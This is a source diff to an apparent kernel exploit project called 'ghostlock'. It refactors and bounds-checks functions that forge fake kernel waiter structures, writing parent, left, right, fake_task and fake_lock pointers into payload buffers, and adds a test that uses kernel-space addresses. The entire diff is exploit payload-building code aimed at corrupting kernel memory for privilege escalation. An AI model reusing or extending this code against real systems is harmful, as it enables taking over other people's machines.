@@ -2,9 +2,48 @@
 
 #include <string.h>
 
+#include <algorithm>
+#include <cstddef>
+#include <span>
+
 static void store64(unsigned char *p, size_t off, uint64_t value) {
   memcpy(p + off, &value, sizeof(value));
 }
+
+namespace ghostlock {
+
+static bool span_store64(std::span<std::byte> bytes, size_t offset,
+                         uint64_t value) noexcept {
+  if (offset > bytes.size() || sizeof(value) > bytes.size() - offset) {
+    return false;
+  }
+  memcpy(bytes.data() + offset, &value, sizeof(value));
+  return true;
+}
+
+bool encode_compact_waiter(std::span<std::byte> waiter,
+                           const WriteRequest &request,
+                           const PayloadWriteLayout &layout) noexcept {
+  if (waiter.size() < 0x30) return false;
+  if (layout.right) {
+    return span_store64(waiter, 0x18, layout.right) &&
+           span_store64(waiter, 0x20, 0) &&
+           span_store64(waiter, 0x28, request.target);
+  }
+  return span_store64(waiter, 0x18, layout.parent) &&
+         span_store64(waiter, 0x20, layout.right) &&
+         span_store64(waiter, 0x28, layout.left);
+}
+
+bool encode_multicast_waiter(std::span<std::byte> buffer,
+                             size_t waiter_offset, size_t task_offset,
+                             size_t lock_offset, uintptr_t fake_task,
+                             uintptr_t fake_lock) noexcept {
+  return span_store64(buffer, waiter_offset + task_offset, fake_task) &&
+         span_store64(buffer, waiter_offset + lock_offset, fake_lock);
+}
+
+}  // namespace ghostlock
 
 PayloadWriteLayout payload_write_layout(
     const WriteRequest *request, uintptr_t page_base,
@@ -31,15 +70,9 @@ PayloadWriteLayout payload_write_layout(
 void build_compact_waiter_payload(
     unsigned char *waiter, const WriteRequest *request,
     const PayloadWriteLayout *layout) {
-  if (layout->right) {
-    store64(waiter, 0x18, layout->right);
-    store64(waiter, 0x20, 0);
-    store64(waiter, 0x28, request->target);
-    return;
-  }
-  store64(waiter, 0x18, layout->parent);
-  store64(waiter, 0x20, layout->right);
-  store64(waiter, 0x28, layout->left);
+  if (!waiter || !request || !layout) return;
+  (void)ghostlock::encode_compact_waiter(
+      {reinterpret_cast<std::byte *>(waiter), 0x30}, *request, *layout);
 }
 
 int payload_write_layout_matches_request(
@@ -61,8 +94,12 @@ int payload_write_layout_accepts_page(
 void build_multicast_waiter_payload(
     unsigned char *buffer, size_t waiter_offset, size_t task_offset,
     size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock) {
-  store64(buffer, waiter_offset + task_offset, fake_task);
-  store64(buffer, waiter_offset + lock_offset, fake_lock);
+  if (!buffer) return;
+  const size_t required = waiter_offset +
+      std::max(task_offset, lock_offset) + sizeof(uint64_t);
+  (void)ghostlock::encode_multicast_waiter(
+      {reinterpret_cast<std::byte *>(buffer), required}, waiter_offset,
+      task_offset, lock_offset, fake_task, fake_lock);
 }
 
 static uint64_t load64(const unsigned char *p, size_t off) {
@@ -117,5 +154,7 @@ int payload_builder_fixed_vector_test(void) {
       current_stamp, 0x20, 0x28, 0x30,
       0xffffff8800005800ULL, 0xffffff8800001000ULL);
   if (memcmp(legacy_stamp, current_stamp, sizeof(legacy_stamp)) != 0) return 0;
+  std::byte undersized[0x2f]{};
+  if (ghostlock::encode_compact_waiter(undersized, w1, rejected)) return 0;
   return 1;
 }
